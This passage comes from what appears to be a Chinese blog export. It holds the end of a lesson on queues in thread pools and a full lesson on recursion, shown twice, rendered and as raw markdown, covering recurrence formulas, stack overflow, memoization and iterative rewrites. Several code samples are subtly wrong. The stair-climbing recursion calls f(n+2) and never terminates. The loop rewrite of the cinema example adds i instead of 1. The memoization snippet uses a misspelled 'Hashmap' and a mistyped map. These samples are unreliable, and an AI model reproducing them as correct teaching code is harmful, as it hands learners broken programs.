title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>队列的知识讲完了，我们来看一下开篇的问题。线程池没有空闲线程时，新的任务请求线程资源时，线程池该如何处理，各种处理策略又是如何实现的呢？</p>\n<p>我们一般有两种处理策略。第一种是非阻塞的处理方式，直接拒绝任务请求；另一种是阻塞的处理方式，将请求进行排队，等到有空闲线程时，取出队列中的请求继续处理。那如何存储排队的请求呢？</p>\n<p>我们希望公平的处理每个排队的请求，先进者先出，所以队列这种数据结构很适合存储排队请求。我们前面说过，队列有基于链表和基于数组这两种方式，那这两种实现方式对于排队请求又有什么区别呢？</p>\n<p>基于链表实现的方式，可以实现一个支持无限排队的无界队列，但是可能会导致过多的请求排队等待，请求处理的响应时间过长。所以，针对响应时间较敏感的系统，基于链表实现的无限排队的线程池是不合适的。</p>\n<p>而基于数组实现的有界队列，队列的大小有限，所以线程池中排队的请求超过队列大小时，接下来的请求就会被拒绝，这种方式对响应时间敏感的系统，就相对来说比较合理。不过设置一个合适的队列大小，也是非常有讲究的。队列太大导致等待的请求太多，队列太小会导致无法充分利用系统资源，发挥最大性能。</p>\n<p>除了前面讲到的应用在线程池请求排队的场景之外，队列还可以应用在任何有限资源池中，用于排队请求，比如数据库连接池。实际上，对于大部分资源有限的场景，当没有空闲资源时，基本上都可以通过队列这种数据结构来实现队列请求排队。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天我们讲了一种跟栈很相似的数据结构，队列。</p>\n<p>队列最大的特点就是先进先出，主要的两个操作是入队和出队。跟栈一样，它既可以用数组来实现，也可以用链表来实现。用数组实现的叫顺序队列，用链表实现的叫链式队列。特别是一个长得像环一样的叫循环队列。在用数组实现的队列时，会有数据搬移的工作，要想解决数据搬移的工作，我们就需要像环一样的循环队列。</p>\n<p>循环队列是这篇的重点，要想写出没有bug的循环队列的实现代码，关键是要确定队满和队空的判定条件。</p>\n<p>除此之外，还有几种高级的数据结构，阻塞队列、并发队列，但是底层都是队列这种数据结构，只不过附加了其他的一些功能。阻塞队列就是可以对出队、入队操作进行阻塞，并发队列就是保证了多线程的队列操作线程安全。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3></div><br></div>\n\n<p>1、 除了线程池这种池结构会用到队列排队请求，你还知道那些类似的数据结构或者场景会用到队列的排队请求。</p>\n<p>如数据库的连接池、分布式应用中的消息队列（kafka、MQ）</p>\n<p>2、 关于并发队列，如何实现无锁的并发队列。</p>\n<blockquote>\n<p>提示： CAS(compare and swap) 乐观锁 悲观锁</p>\n</blockquote>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n"},{"title":"算法-递归","date":"2018-09-17T16:18:36.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n推荐注册返佣金这个功能我想你应该不陌生吧？现在很多app都有这个功能。这个功能中，用户A推荐用户B注册，用户B又推荐了用户C注册，我们可以说C的“最终推荐人”为用户A，用户B的“最终推荐人”也为用户A，用户A没有“最终推荐人”。\n\n一般来说，我们会通过数据库记录这种推荐关系，在数据库表中，我们可以记录两行数据，其中actor_id表示用户id，referrer_id表示推荐人id。\n\n|actor_id|referer_id|\n|:-------:----------|\n| B      |  A       |\n| C      |  B       |\n\n\n基于这个背景，我的问题是，<font color=\"red\">**给定一个用户ID，如何查找这个用户的“最终推荐人”？**</font> 带着这个问题，我们来学习今天的内容，递归（Recursion）！\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解递归\n{% endnote %}\n</div>\n\n从我自己学习数据结构和算法的经历来看，我个人觉得，有两个最难理解的知识点，一个是**动态规划**，另一个就是**递归**。\n\n递归是一种应用非常广泛的算法，之后很多的数据结构和算法的编码实现都要用到递归，比如DFS深度优先搜索，前中后序二叉树遍历等等，所以，搞懂递归非常重要，否则，后面复杂一点的数据结构和算法学起来就会比较吃力。\n\n不过，别看我说了这么多，递归本身可一点不“高冷”，我们生活中就有很多用到递归的例子。\n\n比如周末你带着女朋友去电影院看电影，女朋友问你，我们坐在第几排？电影院太黑了，没法数，现在你怎么办？\n\n这时候递归就派上用场了，于是你问前面一排的人他是第几排，你想只要在他的数字上加一，就知道自己在那一排了。但是，前面的人也不清楚，所以他也问他前面的人，就这样一排一排往前问，直到问道第一排的人，说我在第一排，然后在这样一排一排再把数字传回来，直到你前面的人告诉你他在那一排，于是你就知道答案了。\n\n这就是一个标准的用递归求解问题的分解过程，去的过程叫“递”，回来的过程叫“归”。基本上，所有的递归问题都可以用递推公式来表示，刚刚这个生活中的例子，我们用递推公式来表示就是下面这样的\n\n$$ f(n) = f(n-1) +1 ;\\\\ 其中f(1)=1 $$\n\nf(n)表示你想知道自己在那一排，f(n-1) 表示前面一个人所在的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们就可以很轻松的将它改为递归代码：\n```C\nint f(int n){\n\tif(n==1) return 1;\n\treturn f(n-1)+1;\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 什么时候可以用递归呢\n{% endnote %}\n</div>\n\n刚刚这个例子是典型的递归，那究竟什么问题可以用递归来解决呢？我这总结了三个条件，只要同时满足以下三个条件，就可以用递归来解决 。\n\n**1、一个问题的解可以分解为几个子问题的解**\n\n何为子问题？子问题就是数据规模更小的问题。比如，前面的电影院的例子，你要知道自己在哪排，可以分解为\"前一排的人在那一排？\"这样一个子问题。\n\n**2、这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样**\n\n还是以电影院的例子说明，你求解“自己在那一排”，和前面的人求解“自己在那一排”的思路，是完全一样的。\n\n**3、存在递归终止条件**\n\n把问题分解为子问题，再把子问题分解为子子问题，一层一层分解，不能存在无限循环，这就需要存在终止条件。在电影院的例子中，第一排的人不需要再继续询问任何人，就知道自己在那一排，也就是f(1)=1，这就是递归的终止条件。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何写递归代码\n{% endnote %}\n</div>\n\n说了这么多，那如何写递归代码呢？个人觉得，写递归代码最关键的是<font face=\"微软雅黑\" color=\"red\">**写出递推公式，找到终止条件**</font>，剩下将递推公式转化为代码就很容易了。\n\n我这里举个例子，来一步一步实现递归代码。\n\n> 如果有n个台阶，每次你可以跨 1 个台阶或者 2 个台阶，请问走完这n个台阶有多少种走法？\n\n如果有7个台阶，你可以走2、2、2、1这样上去，也可以走1、2、1、1、2这个样子上去，总之有很多中走法，那如何用编程来求总共有多少种走法呢？\n\n我们仔细想一下，实际上，可以根据第一步的走法把所有走法分为两类，第一类是第一步走了1个台阶，另一类是第一步走了2个台阶，所以，n个台阶的走法就等于先走一个台阶后，n个台阶的走法加上先走2个台阶后，n-2个台阶的走法，用公式表示就是：\n$$f(n) = f(n-1) + f(n-2) $$\n\n有了递推公式，递归代码基本就完成了一半。我们再来看下终止条件。当有一个台阶时，我们不需要再继续递归，就只有一种走法，所以f(1)=1。那么这个终止条件够吗？我们可以用n=2，n=3这些较小的数实验一下。\n\nn=2时，f(2)=f(1)+f(0),已知的终止条件为f(1)=1,所以f(2)就无法求解了，所以除了f(1)=1这个终止条件之外，我们还需要f(0)=1，表示0个台阶有一种走法，不过这样就不符合正常逻辑了。所以我们可以把f(2)作为一个终止条件，表示走2个台阶，有两种走法（一步走完或者分两步走）。\n\n所以最终的终止条件就是f(1)=1,f(2)=2。这个时候，可以拿n=3，n=4来验证一下，这个终止条件是否足够或者正确。\n\n我们把刚刚的递推公式和终止条件放到一起就是最终的递推公式：\n$$ f(n) = f(n-1) + f(n-2); \\\\ 其中 \\\\ f(1)=1, f(2)=2; $$\n\n有了上面的递推公式，转化成代码就简单多了，最终的递归代码如下：\n```C\nint f(int n) {\n\tif(n==1) return 1;\n\tif(n==2) return 2;\n\treturn f(n-1)+f(n+2);\n}\n```\n\n总结一下，<font color=\"red\">**写递归代码的关键就是要找到如何将大问题分解为小问题的规律，并且基于此写出递推公式，然后在推敲递推终止条件，最后再将递推公式转化为递归代码。**</font>\n\n讲了这么多方法，是不是你现在还是有种想不太清楚的地方呢？实际上，这也是文章开头我说递归代码比较难理解的地方。\n\n上面举的电影院的例子，我们的递归调用只有一个分支，也就是说“一个问题只需要分解为一个子问题”，我们可以很容易的想清楚“递”和“归”的每一个步骤，说以写起来、理解起来都不难。\n\n但是，当我们面对的是一个问题分解为多个子问题的情况时，递归代码就没那么好理解了。\n\n像刚刚讲的第二个爬台阶的例子，人脑几乎没办法把整个\"递\"和\"归\"的过程一步一步都想清楚。\n\n计算机擅长做重复的事，所以递归正和它的胃口。而我们人脑更喜欢平铺直述的思维方式，当我们看到递归时，我们总想把递归平铺展开，脑子里就会循环，一层一层往下调，然后在一层一层返回，试图搞清楚计算机每一步是怎样执行的，这样就会很容易绕进去。\n\n对于递归代码，这种试图想清楚整个递和归过程的做法，实际上是进入了一个思维误区。很多时候，我们理解起来比较吃力，主要原因就是自己给自己制造了这种理解障碍。那正确的思维方式应该是怎样的呢？\n\n如果一个问题A可以分解为若干子问题B、C、D，你可以假设子问题B、C、D已经解决，在此基础上思考和解决问题A，而且，你只需要思考问题A和子问题B、C、D两层之间的关系即可，不需要一层一层往下思考子问题与子子问题，子子问题与子子子问题之间的关系。屏蔽掉递归细节，这样子理解起来就简单多了。\n\n因此，编写递归代码的关键是，**只要遇到递归，我么就把它抽象成一个递推公式，不用想一层层的调用关系，不要试图用人脑去分解递归的每个步骤**\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 递归代码警惕堆栈溢出\n{% endnote %}\n</div>\n\n在实际的软件开发中，编写递归代码时，我们会遇到很多问题，比如堆栈溢出，而堆栈溢出会造成系统性崩溃，后果会非常严重。为什么递归代码容易造成堆栈溢出呢？我们又如何预防堆栈溢出呢？\n\n在\"栈\"那一节讲过，函数调用会使用栈来保存临时变量。每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完返回时，才出栈。系统栈或虚拟机栈一般都不会很大，如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险。\n\n比如上面求解的电影院的例子，如果我们将系统栈或者虚拟机栈的大小设置为1KB，在求解f(19999)时就会出现如下堆栈错误：\n```java\nException in thread \"main\" java.lang.StackOverflowError\n```\n\n那么如何避免堆栈溢出呢？\n\n我们可以通过在代码中限制递归调用的最大深度的方式来解决这个问题。递归调用超过一定深度（比如1000）之后，我么就不在继续往下递归了，直接返回报错。还是电影院那个例子，我们可以改造成下面这个样子，就可以避免堆栈溢出了。不过，我这写的是些伪代码，为了代码的简洁，有些边界条件没有考虑，比如n<=0。\n\n```C\n// 表示递归的深度\nint depth = 0;\nint f(int n){\n\t++depth;\n\tif(depth>1000)throw exception;\n\n\tif(n==1) return 1;\n\treturn f(n-1)+1;\n}\n```\n但这种做法并不能完全解决问题，因为最大允许的递归深度跟当前线程剩余的栈空间大小有关，事先无法计算。如果实时计算，代码过于复杂，就会影响了代码的可读性。所以，如果最大深度比较小，比如10、50，就可以用这种方法，否则这种方法并不是很实用。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 递归代码警惕重复计算\n{% endnote %}\n</div>\n\n除此之外，使用递归时还会出现重复计算的问题，将刚才讲的第二个递归代码的例子，如果我们把整个递归过程分解一下的话，那就是这样的：\n{% asset_img 台阶递归图.jpg %}\n\n从图中，我们可以直观的看到，想要计算f(5)，需要先计算f(4)、f(3)，而计算f(4)还需要计算f(3)，因此f(3)就被计算了很多次，这就是重复计算问题。\n\n为了避免重复计算问题，我们可以用一个数据结构（比如散列表）来保存已经求解过的f(n)。当递归调用到f(n)时，先看下是否已经求解过了。如果是则直接从散列表中取值返回，不需要重复计算，这样就能避免刚才讲的重复计算了。\n\n按照上面的思路，我们再来改造一下代码：\n```java\nMap<String, Integer> map = new Hashmap<>();\npublic static int f(int n){\n\tif(n==1) return 1;\n\tif(n==2) return 2;\n\tif(map.containsKey(n)){\n\t\treturn map.get(n);\n\t}\n\tint ret = f(n-1) + f(n-2);\n\tmap.put(n, ret);\n\treturn ret;\n}\n```\n\n除了堆栈溢出、重复计算这两个常见的问题，递归代码还有其他很多别的问题。\n\n在时间效率上，递归代码里多了很多函数调用，当这些函数调用的数量较大时，就会积累成一个可观的时间成本。在空间复杂度上，因为递归调用一次就会在内存栈上保存一次现场数据，所以进行递归代码的空间复杂度分析时，需要考虑这部分的开销。比如电影院的的例子中，空间复杂度并不是O(1)，而是O(n)。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 怎样将递归代码改写为非递归代码\n{% endnote %}\n</div>\n\n我们刚讲了，递归有利有弊，利是递归代码的表达力很强，写起来非常简洁；而弊是空间复杂度高，有堆栈溢出的风险，存在重复计算的问题，过多的函数调用会导致耗时较多等问题。所以在实际开发中，我们需要根据实际情况来选择是否需要用递归的方式来实现。\n\n那我们是否可以将递归代码改写为非递归代码呢？\n\n仍以刚才的电影院的例子，我们抛开场景，只看f(n) = f(n-1)+1 这个递推公式。我们可以这样改改看看：\n```C\nint f(int n){\n\tint ret = 1;\n\tfor(int i=2; i<=n; ++i){\n\t\tret = ret+i;\n\t}\n\treturn ret;\n}\n```\n\n同样，第二个例子也可以改写为非递归的方式实现。\n\n```C\nint f(int n){\n\tif(n==1)return 1;\n\tif(n==2)return 2;\n\n\tint ret = 0;\n\tint prepre = 1; // f(1)=1\n\tint pre = 2;    // f(2)=2\n\tfor(int i=3;i<=n;++i){ //f(3) = f(2)+f(1)\n\t\tret = pre + prepre;\n\t\tprepre = pre;\n\t\tpre = ret;\n\t}\n\treturn ret;\n}\n```\n\n那是不是所有的递归代码都可以改写为这种**迭代循环**的非递归写法呢？\n\n笼统的讲，是的。因为递归本身就是借助栈来实现的，只不过我们使用的栈是系统或者虚拟机本身提供的，我们没有感知罢了。如果我们自己在内存堆上实现栈，手动模拟入栈、出栈过程，这样任何递归代码都可以改写成看上去不是递归代码的样子。\n\n但是这种思路实现上是将递归改为了“手动”递归，本质并没有变，而且也没有解决前面讲到的基础问题，徒增了实现的复杂度。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n到此为止，递归相关的知识也讲完了，我们来看一下开篇的问题：如何找到“最终推荐人”？我们的解决方案是这样的：\n\n```java\nlong findRootRefererId(long actorId){\n\tlong refererId = select referer_id from [table] where actor_id = actorId;\n\tif(refererId == null) return actorId;\n\treturn findRootRefererId(refererId)\n}\n```\n\n是不是非常简洁，用三行代码就搞定了，不过在实际项目中，上面的代码并不能工作，为什么呢？这里有两个问题。\n\n第一，如果递归很深，可能会有堆栈溢出问题。\n\n第二，如果数据库存在脏数据，我们还需要处理由此产生的无限循环递归的问题。比如demo环境下数据库中，测试工程师为了方便测试，会认为的插入一些数据，就会出现脏数据，如果A的推荐人是B，B的推荐人是C，C的推荐人是A，这样就会发生死循环。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n递归是一种非常高效、简洁的编码技巧，只要满足“三个条件”的问题都可以通过递归代码来解决。\n\n不过递归代码也比较难写、难理解。编写递归代码的关键就是不要把自己绕进去，正确姿势是写出递推公式，找到终止条件，然后再翻译成递归代码。\n\n递归代码虽然简洁高效，但是递归代码也有很多弊端。比如，堆栈溢出、重复计算、函数调用耗时多、空间复杂度高等，所以，在编写递归代码时，一定要控制好这些副作用。\n\n\n### 思考题\n\n1、 递归代码的时间复杂度该如何分析？\n\n2、 递归代码如何调试呢？你有什么好的调试方法吗？\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-递归.md","raw":"---\ntitle: 算法-递归\ndate: 2018-09-18 00:18:36\ntags: ['算法','递归']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n推荐注册返佣金这个功能我想你应该不陌生吧？现在很多app都有这个功能。这个功能中，用户A推荐用户B注册，用户B又推荐了用户C注册，我们可以说C的“最终推荐人”为用户A，用户B的“最终推荐人”也为用户A，用户A没有“最终推荐人”。\n\n一般来说，我们会通过数据库记录这种推荐关系，在数据库表中，我们可以记录两行数据，其中actor_id表示用户id，referrer_id表示推荐人id。\n\n|actor_id|referer_id|\n|:-------:----------|\n| B      |  A       |\n| C      |  B       |\n\n\n基于这个背景，我的问题是，<font color=\"red\">**给定一个用户ID，如何查找这个用户的“最终推荐人”？**</font> 带着这个问题，我们来学习今天的内容，递归（Recursion）！\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解递归\n{% endnote %}\n</div>\n\n从我自己学习数据结构和算法的经历来看，我个人觉得，有两个最难理解的知识点，一个是**动态规划**，另一个就是**递归**。\n\n递归是一种应用非常广泛的算法，之后很多的数据结构和算法的编码实现都要用到递归，比如DFS深度优先搜索，前中后序二叉树遍历等等，所以，搞懂递归非常重要，否则，后面复杂一点的数据结构和算法学起来就会比较吃力。\n\n不过，别看我说了这么多，递归本身可一点不“高冷”，我们生活中就有很多用到递归的例子。\n\n比如周末你带着女朋友去电影院看电影，女朋友问你，我们坐在第几排？电影院太黑了，没法数，现在你怎么办？\n\n这时候递归就派上用场了，于是你问前面一排的人他是第几排，你想只要在他的数字上加一，就知道自己在那一排了。但是，前面的人也不清楚，所以他也问他前面的人，就这样一排一排往前问，直到问道第一排的人，说我在第一排，然后在这样一排一排再把数字传回来，直到你前面的人告诉你他在那一排，于是你就知道答案了。\n\n这就是一个标准的用递归求解问题的分解过程，去的过程叫“递”，回来的过程叫“归”。基本上，所有的递归问题都可以用递推公式来表示，刚刚这个生活中的例子，我们用递推公式来表示就是下面这样的\n\n$$ f(n) = f(n-1) +1 ;\\\\ 其中f(1)=1 $$\n\nf(n)表示你想知道自己在那一排，f(n-1) 表示前面一个人所在的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们就可以很轻松的将它改为递归代码：\n```C\nint f(int n){\n\tif(n==1) return 1;\n\treturn f(n-1)+1;\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 什么时候可以用递归呢\n{% endnote %}\n</div>\n\n刚刚这个例子是典型的递归，那究竟什么问题可以用递归来解决呢？我这总结了三个条件，只要同时满足以下三个条件，就可以用递归来解决 。\n\n**1、一个问题的解可以分解为几个子问题的解**\n\n何为子问题？子问题就是数据规模更小的问题。比如，前面的电影院的例子，你要知道自己在哪排，可以分解为\"前一排的人在那一排？\"这样一个子问题。\n\n**2、这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样**\n\n还是以电影院的例子说明，你求解“自己在那一排”，和前面的人求解“自己在那一排”的思路，是完全一样的。\n\n**3、存在递归终止条件**\n\n把问题分解为子问题，再把子问题分解为子子问题，一层一层分解，不能存在无限循环，这就需要存在终止条件。在电影院的例子中，第一排的人不需要再继续询问任何人，就知道自己在那一排，也就是f(1)=1，这就是递归的终止条件。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何写递归代码\n{% endnote %}\n</div>\n\n说了这么多，那如何写递归代码呢？个人觉得，写递归代码最关键的是<font face=\"微软雅黑\" color=\"red\">**写出递推公式，找到终止条件**</font>，剩下将递推公式转化为代码就很容易了。\n\n我这里举个例子，来一步一步实现递归代码。\n\n> 如果有n个台阶，每次你可以跨 1 个台阶或者 2 个台阶，请问走完这n个台阶有多少种走法？\n\n如果有7个台阶，你可以走2、2、2、1这样上去，也可以走1、2、1、1、2这个样子上去，总之有很多中走法，那如何用编程来求总共有多少种走法呢？\n\n我们仔细想一下，实际上，可以根据第一步的走法把所有走法分为两类，第一类是第一步走了1个台阶，另一类是第一步走了2个台阶，所以，n个台阶的走法就等于先走一个台阶后，n个台阶的走法加上先走2个台阶后，n-2个台阶的走法，用公式表示就是：\n$$f(n) = f(n-1) + f(n-2) $$\n\n有了递推公式，递归代码基本就完成了一半。我们再来看下终止条件。当有一个台阶时，我们不需要再继续递归，就只有一种走法，所以f(1)=1。那么这个终止条件够吗？我们可以用n=2，n=3这些较小的数实验一下。\n\nn=2时，f(2)=f(1)+f(0),已知的终止条件为f(1)=1,所以f(2)就无法求解了，所以除了f(1)=1这个终止条件之外，我们还需要f(0)=1，表示0个台阶有一种走法，不过这样就不符合正常逻辑了。所以我们可以把f(2)作为一个终止条件，表示走2个台阶，有两种走法（一步走完或者分两步走）。\n\n所以最终的终止条件就是f(1)=1,f(2)=2。这个时候，可以拿n=3，n=4来验证一下，这个终止条件是否足够或者正确。\n\n我们把刚刚的递推公式和终止条件放到一起就是最终的递推公式：\n$$ f(n) = f(n-1) + f(n-2); \\\\ 其中 \\\\ f(1)=1, f(2)=2; $$\n\n有了上面的递推公式，转化成代码就简单多了，最终的递归代码如下：\n```C\nint f(int n) {\n\tif(n==1) return 1;\n\tif(n==2) return 2;\n\treturn f(n-1)+f(n+2);\n}\n```\n\n总结一下，<font color=\"red\">**写递归代码的关键就是要找到如何将大问题分解为小问题的规律，并且基于此写出递推公式，然后在推敲递推终止条件，最后再将递推公式转化为递归代码。**</font>\n\n讲了这么多方法，是不是你现在还是有种想不太清楚的地方呢？实际上，这也是文章开头我说递归代码比较难理解的地方。\n\n上面举的电影院的例子，我们的递归调用只有一个分支，也就是说“一个问题只需要分解为一个子问题”，我们可以很容易的想清楚“递”和“归”的每一个步骤，说以写起来、理解起来都不难。\n\n但是，当我们面对的是一个问题分解为多个子问题的情况时，递归代码就没那么好理解了。\n\n像刚刚讲的第二个爬台阶的例子，人脑几乎没办法把整个\"递\"和\"归\"的过程一步一步都想清楚。\n\n计算机擅长做重复的事，所以递归正和它的胃口。而我们人脑更喜欢平铺直述的思维方式，当我们看到递归时，我们总想把递归平铺展开，脑子里就会循环，一层一层往下调，然后在一层一层返回，试图搞清楚计算机每一步是怎样执行的，这样就会很容易绕进去。\n\n对于递归代码，这种试图想清楚整个递和归过程的做法，实际上是进入了一个思维误区。很多时候，我们理解起来比较吃力，主要原因就是自己给自己制造了这种理解障碍。那正确的思维方式应该是怎样的呢？\n\n如果一个问题A可以分解为若干子问题B、C、D，你可以假设子问题B、C、D已经解决，在此基础上思考和解决问题A，而且，你只需要思考问题A和子问题B、C、D两层之间的关系即可，不需要一层一层往下思考子问题与子子问题，子子问题与子子子问题之间的关系。屏蔽掉递归细节，这样子理解起来就简单多了。\n\n因此，编写递归代码的关键是，**只要遇到递归，我么就把它抽象成一个递推公式，不用想一层层的调用关系，不要试图用人脑去分解递归的每个步骤**\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 递归代码警惕堆栈溢出\n{% endnote %}\n</div>\n\n在实际的软件开发中，编写递归代码时，我们会遇到很多问题，比如堆栈溢出，而堆栈溢出会造成系统性崩溃，后果会非常严重。为什么递归代码容易造成堆栈溢出呢？我们又如何预防堆栈溢出呢？\n\n在\"栈\"那一节讲过，函数调用会使用栈来保存临时变量。每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完返回时，才出栈。系统栈或虚拟机栈一般都不会很大，如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险。\n\n比如上面求解的电影院的例子，如果我们将系统栈或者虚拟机栈的大小设置为1KB，在求解f(19999)时就会出现如下堆栈错误：\n```java\nException in thread \"main\" java.lang.StackOverflowError\n```\n\n那么如何避免堆栈溢出呢？\n\n我们可以通过在代码中限制递归调用的最大深度的方式来解决这个问题。递归调用超过一定深度（比如1000）之后，我么就不在继续往下递归了，直接返回报错。还是电影院那个例子，我们可以改造成下面这个样子，就可以避免堆栈溢出了。不过，我这写的是些伪代码，为了代码的简洁，有些边界条件没有考虑，比如n<=0。\n\n```C\n// 表示递归的深度\nint depth = 0;\nint f(int n){\n\t++depth;\n\tif(depth>1000)throw exception;\n\n\tif(n==1) return 1;\n\treturn f(n-1)+1;\n}\n```\n但这种做法并不能完全解决问题，因为最大允许的递归深度跟当前线程剩余的栈空间大小有关，事先无法计算。如果实时计算，代码过于复杂，就会影响了代码的可读性。所以，如果最大深度比较小，比如10、50，就可以用这种方法，否则这种方法并不是很实用。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 递归代码警惕重复计算\n{% endnote %}\n</div>\n\n除此之外，使用递归时还会出现重复计算的问题，将刚才讲的第二个递归代码的例子，如果我们把整个递归过程分解一下的话，那就是这样的：\n{% asset_img 台阶递归图.jpg %}\n\n从图中，我们可以直观的看到，想要计算f(5)，需要先计算f(4)、f(3)，而计算f(4)还需要计算f(3)，因此f(3)就被计算了很多次，这就是重复计算问题。\n\n为了避免重复计算问题，我们可以用一个数据结构（比如散列表）来保存已经求解过的f(n)。当递归调用到f(n)时，先看下是否已经求解过了。如果是则直接从散列表中取值返回，不需要重复计算，这样就能避免刚才讲的重复计算了。\n\n按照上面的思路，我们再来改造一下代码：\n```java\nMap<String, Integer> map = new Hashmap<>();\npublic static int f(int n){\n\tif(n==1) return 1;\n\tif(n==2) return 2;\n\tif(map.containsKey(n)){\n\t\treturn map.get(n);\n\t}\n\tint ret = f(n-1) + f(n-2);\n\tmap.put(n, ret);\n\treturn ret;\n}\n```\n\n除了堆栈溢出、重复计算这两个常见的问题，递归代码还有其他很多别的问题。\n\n在时间效率上，递归代码里多了很多函数调用，当这些函数调用的数量较大时，就会积累成一个可观的时间成本。在空间复杂度上，因为递归调用一次就会在内存栈上保存一次现场数据，所以进行递归代码的空间复杂度分析时，需要考虑这部分的开销。比如电影院的的例子中，空间复杂度并不是O(1)，而是O(n)。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 怎样将递归代码改写为非递归代码\n{% endnote %}\n</div>\n\n我们刚讲了，递归有利有弊，利是递归代码的表达力很强，写起来非常简洁；而弊是空间复杂度高，有堆栈溢出的风险，存在重复计算的问题，过多的函数调用会导致耗时较多等问题。所以在实际开发中，我们需要根据实际情况来选择是否需要用递归的方式来实现。\n\n那我们是否可以将递归代码改写为非递归代码呢？\n\n仍以刚才的电影院的例子，我们抛开场景，只看f(n) = f(n-1)+1 这个递推公式。我们可以这样改改看看：\n```C\nint f(int n){\n\tint ret = 1;\n\tfor(int i=2; i<=n; ++i){\n\t\tret = ret+i;\n\t}\n\treturn ret;\n}\n```\n\n同样，第二个例子也可以改写为非递归的方式实现。\n\n```C\nint f(int n){\n\tif(n==1)return 1;\n\tif(n==2)return 2;\n\n\tint ret = 0;\n\tint prepre = 1; // f(1)=1\n\tint pre = 2;    // f(2)=2\n\tfor(int i=3;i<=n;++i){ //f(3) = f(2)+f(1)\n\t\tret = pre + prepre;\n\t\tprepre = pre;\n\t\tpre = ret;\n\t}\n\treturn ret;\n}\n```\n\n那是不是所有的递归代码都可以改写为这种**迭代循环**的非递归写法呢？\n\n笼统的讲，是的。因为递归本身就是借助栈来实现的，只不过我们使用的栈是系统或者虚拟机本身提供的，我们没有感知罢了。如果我们自己在内存堆上实现栈，手动模拟入栈、出栈过程，这样任何递归代码都可以改写成看上去不是递归代码的样子。\n\n但是这种思路实现上是将递归改为了“手动”递归，本质并没有变，而且也没有解决前面讲到的基础问题，徒增了实现的复杂度。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n到此为止，递归相关的知识也讲完了，我们来看一下开篇的问题：如何找到“最终推荐人”？我们的解决方案是这样的：\n\n```java\nlong findRootRefererId(long actorId){\n\tlong refererId = select referer_id from [table] where actor_id = actorId;\n\tif(refererId == null) return actorId;\n\treturn findRootRefererId(refererId)\n}\n```\n\n是不是非常简洁，用三行代码就搞定了，不过在实际项目中，上面的代码并不能工作，为什么呢？这里有两个问题。\n\n第一，如果递归很深，可能会有堆栈溢出问题。\n\n第二，如果数据库存在脏数据，我们还需要处理由此产生的无限循环递归的问题。比如demo环境下数据库中，测试工程师为了方便测试，会认为的插入一些数据，就会出现脏数据，如果A的推荐人是B，B的推荐人是C，C的推荐人是A，这样就会发生死循环。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n递归是一种非常高效、简洁的编码技巧，只要满足“三个条件”的问题都可以通过递归代码来解决。\n\n不过递归代码也比较难写、难理解。编写递归代码的关键就是不要把自己绕进去，正确姿势是写出递推公式，找到终止条件，然后再翻译成递归代码。\n\n递归代码虽然简洁高效，但是递归代码也有很多弊端。比如，堆栈溢出、重复计算、函数调用耗时多、空间复杂度高等，所以，在编写递归代码时，一定要控制好这些副作用。\n\n\n### 思考题\n\n1、 递归代码的时间复杂度该如何分析？\n\n2、 递归代码如何调试呢？你有什么好的调试方法吗？\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     